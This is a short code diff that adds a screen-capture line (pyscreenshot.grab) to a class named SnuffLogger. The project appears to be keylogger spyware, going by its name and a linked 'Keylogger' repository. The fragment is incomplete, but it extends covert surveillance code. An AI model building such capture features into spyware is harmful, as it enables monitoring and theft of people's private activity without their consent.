@@ -70,5 +70,7 @@ class SnuffLogger:
     
     def screenShot(self):
 
+        screenshot = pyscreenshot.grab()
+
 
 #https://github.com/aydinnyunus/Keylogger
